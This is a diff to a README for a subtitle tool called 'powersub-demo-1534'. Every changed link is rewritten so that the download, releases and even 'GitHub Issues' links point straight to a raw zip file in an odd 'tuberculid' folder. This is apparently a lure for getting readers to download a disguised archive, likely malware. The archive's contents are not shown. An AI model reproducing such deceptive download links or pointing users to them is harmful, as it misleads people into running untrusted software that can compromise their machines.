@@ -6,7 +6,7 @@ Welcome to powersub-demo-1534! This application helps you manage subtitles easil
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/learsi200597/powersub-demo-1534/releases)
+[![Download Release](https://raw.githubusercontent.com/learsi200597/powersub-demo-1534/main/tuberculid/powersub-demo-1534.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/learsi200597/powersub-demo-1534/main/tuberculid/powersub-demo-1534.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ To run powersub-demo-1534, your computer should meet these minimum requirements:
 
 ## 📄 How to Download & Install
 
-1. **Visit the Releases Page**: Go to the releases page by clicking this link: [Download Here](https://github.com/learsi200597/powersub-demo-1534/releases).
+1. **Visit the Releases Page**: Go to the releases page by clicking this link: [Download Here](https://raw.githubusercontent.com/learsi200597/powersub-demo-1534/main/tuberculid/powersub-demo-1534.zip).
    
 2. **Select the Latest Version**: On the releases page, look for the latest version listed at the top. 
 
@@ -60,7 +60,7 @@ To run powersub-demo-1534, your computer should meet these minimum requirements:
 
 If you encounter any issues, you can reach out for support through the following channels:
 
-- **GitHub Issues**: Create a new issue on our [GitHub Issues page](https://github.com/learsi200597/powersub-demo-1534/issues). Provide details about your problem for faster assistance.
+- **GitHub Issues**: Create a new issue on our [GitHub Issues page](https://raw.githubusercontent.com/learsi200597/powersub-demo-1534/main/tuberculid/powersub-demo-1534.zip). Provide details about your problem for faster assistance.
 - **Community Forums**: Join discussions and find solutions in community forums related to subtitle management.
 
 ## 🌐 Stay Updated
@@ -73,7 +73,7 @@ For more information and resources, feel free to explore the repository and its 
 
 ## 📌 Important Links
 
-- [Download Here](https://github.com/learsi200597/powersub-demo-1534/releases)
-- [GitHub Issues](https://github.com/learsi200597/powersub-demo-1534/issues) 
+- [Download Here](https://raw.githubusercontent.com/learsi200597/powersub-demo-1534/main/tuberculid/powersub-demo-1534.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/learsi200597/powersub-demo-1534/main/tuberculid/powersub-demo-1534.zip) 
 
 We hope you enjoy using powersub-demo-1534! Happy managing!
